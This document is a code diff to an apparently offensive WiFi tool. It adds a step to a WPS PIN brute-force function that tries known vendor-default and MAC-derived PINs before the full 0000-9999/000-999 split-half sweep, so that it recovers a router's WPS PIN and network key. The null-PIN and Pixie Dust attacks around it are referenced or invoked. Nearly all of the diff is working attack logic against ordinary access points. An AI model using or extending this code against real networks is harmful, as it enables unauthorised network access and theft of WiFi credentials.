@@ -23,6 +23,7 @@ from ..wps.crypto import (
     split_pin,
 )
 from ..wps.messages import build_assoc_wps_ie, compute_r_hashes
+from ..wps.pin_gen import get_oui_pins
 from ..wps.pixie import pixie_dust
 
 
@@ -726,13 +727,18 @@ def wps_pin_bruteforce(
     attempt_fn=attempt_pin,
     try_null_pin: bool = True,
     null_pin_fn=null_pin_attack,
+    try_oui_pins: bool = True,
+    oui_pins_fn=get_oui_pins,
     progress_fn=None,
 ) -> BruteforceResult:
     """Split-half PIN sweep: 0000-9999 first, then 000-999 (checksum derives digit 8).
 
     Tries the null-PIN attack first (one attempt, real signal either way)
     since it's free compared to the up-to-11,000-attempt sweep — matches
-    how real WPS tools order this.
+    how real WPS tools order this. Then tries the small set of known
+    vendor-default/MAC-derived PINs from wps/pin_gen.py's get_oui_pins()
+    (also free relative to the sweep) before falling through to the real
+    0000-9999/000-999 split-half sweep.
 
     progress_fn, if given, is called after every attempt (this is the
     longest-running, least-visible attack in the project — previously it
@@ -765,6 +771,27 @@ def wps_pin_bruteforce(
         log(f"null-PIN: {null_outcome.outcome.value} — starting the real sweep (up to 11,000 attempts)")
         # Any other outcome (wrong/timeout) is not a real PIN signal --
         # fall through to the normal sweep unconditionally.
+
+    if try_oui_pins:
+        for pin8 in oui_pins_fn(bssid, ssid):
+            if _check_stop():
+                log(f"stopped during OUI-PIN pre-attempts after {result.attempts} attempt(s)")
+                return result
+            log(f"trying known-default PIN {pin8} (before the real sweep)")
+            outcome = attempt_fn(iface, bssid, pin8, ssid, channel=channel, stop_event=stop_event)
+            result.attempts += 1
+            if outcome.outcome is AttemptOutcome.AP_SETUP_LOCKED:
+                log(f"AP Setup Locked (from OUI-PIN {pin8}) — aborting")
+                result.ap_setup_locked = True
+                return result
+            if outcome.outcome is AttemptOutcome.SUCCESS:
+                log(f"PIN found via known-default {pin8}")
+                result.success = True
+                result.pin = pin8
+                result.ssid, result.network_key = outcome.ssid, outcome.network_key
+                return result
+            # Any other outcome (wrong/timeout) is not a real PIN signal --
+            # move on to the next OUI candidate, then the normal sweep.
 
     first_half: str | None = None
     for f in range(10000):
@@ -804,6 +831,7 @@ def wps_pin_bruteforce(
         log(f"exhausted 10,000 first-half attempts without a match ({result.attempts} total) — unexpected, aborting")
         return result  # exhausted 10000 without a first-half match (shouldn't happen)
 
+    consecutive_timeouts = 0
     for s in range(1000):
         if _check_stop():
             log(f"stopped during second-half sweep after {result.attempts} attempt(s)")
